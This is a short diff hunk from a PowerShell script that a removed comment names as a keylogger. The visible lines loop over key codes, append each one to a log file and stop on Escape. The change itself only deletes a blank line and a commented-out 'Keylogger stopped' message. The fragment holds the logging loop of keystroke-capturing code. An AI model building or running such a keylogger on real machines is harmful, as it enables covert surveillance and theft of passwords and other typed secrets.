@@ -12,5 +12,3 @@ while ($true) {
     if ($key -eq 27) { break }
     Add-Content -Path $logFile -Value "$key"
 }
-
-#Write-Host "Keylogger stopped."
